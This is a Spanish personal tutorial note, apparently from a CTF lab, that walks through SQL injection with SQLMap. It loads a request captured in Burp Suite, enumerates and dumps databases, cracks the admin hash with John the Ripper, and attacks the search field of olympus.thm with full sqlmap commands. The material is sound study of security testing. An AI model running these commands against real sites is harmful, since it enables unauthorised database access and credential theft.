SQLMap es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación de vulnerabilidades de inyección SQL. SQLMap funciona enviando solicitudes especialmente diseñadas a un servidor web para intentar inyectar código SQL malicioso. Si el servidor es vulnerable a la inyección SQL, SQLMap puede explotar la vulnerabilidad para obtener acceso no autorizado a la base de datos del servidor.

# Carga SQLMap desde archivo
Vamos a realizar un ataque de SQLInjection de forma manual con la herramienta de sqlmap, para ello primero interceptamos la peticion de la solicitud con BurpSuit
![[Pasted image 20240528075116.png]]

Lo agregamos a un documento de texto
![[Pasted image 20240528075141.png]]

Ahora ejecutamos la herramienta de sqlmap
```Bash
sqlmap -r peticion.txt
```
![[Pasted image 20240528075234.png]]

En la siguiente imagen podemos ver que nos ha encontrado la base de datos de MySQL, le indicaremos que yes para que no siga buscando mas BBDD y trabajemos con la que nos ha encontrado
![[Pasted image 20240528075419.png]]

La siguiente pregunta es para decirnos si queremos que siga buscando mas paneles, nosotros seguiremos en el mismo panel de login así que indicaremos que no
![[Pasted image 20240528075536.png]]

En esta pregunta nos esta indicando si queremos que siga buscando mas vulnerabilidades, como ya nos ha encontrado una le diremos que no
![[Pasted image 20240528075656.png]]

Ahora volveremos a ejecutar sqlmap añadiendo el siguiente parametro para que nos muestre las bases de datos
```Bash
sqlmap -r peticion.txt -dbs
```
![[Pasted image 20240528075823.png]]

Ahora como podemos ver nos muestra las bases de datos que ha encontrado
![[Pasted image 20240528075915.png]]

Ahora volveremos a ejecutar sqlmap añadiendo los siguientes parametros para indicar la base de datos y para realizar un dumpeo
```Bash
sqlmap -r peticion.txt -D main -dump
```
![[Pasted image 20240528080100.png]]

Ahora responderemos a las preguntas que aparecen y ya comenzara a realizar el ataque de diccionario para encontrar los hashes
![[Pasted image 20240528080238.png]]

Y como podemos ver ya nos ha encontrado el hash del usuario admin
![[Pasted image 20240528080324.png]]

Ahora utilizaremos una herramienta como John de Ripper para descifrar el hash
![[Pasted image 20240528080430.png]]

# Carga SQLMap desde url
Esta vulnerabilidad indica que podemos hacer una injección de SQL mediante la explotación del campo search de la siguiente url
```
http://olympus.thm/~webmaster/search.php
```

Ejecutamos el siguiente comando con la herramienta sqlmap y encontramos que es vulnerable a la injección de sql
```Bash
sqlmap "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```
![[Pasted image 20240611135709.png]]

Ahora ejecutamos el sigueinte comando para enumerar la base de datos
```Bash
sqlmap "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --tables --random-agent -v 3
```
![[Pasted image 20240611140217.png]]

Despues de continuar con la explotación y encontrar una subida de archivos a la base de datos

La buscamos para ver como lo ha guardado en la base de datos volviendo a ejecutar la injeccion de sql con sqlmap agregando el parametro fresh-queries para refrescar los resultados y como podemos ver se ha subido lo que hemos cargado
```Bash
sqlmap "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump-all --random-agent -v 3 --fresh-queries

```
![[Pasted image 20240612081758.png]]
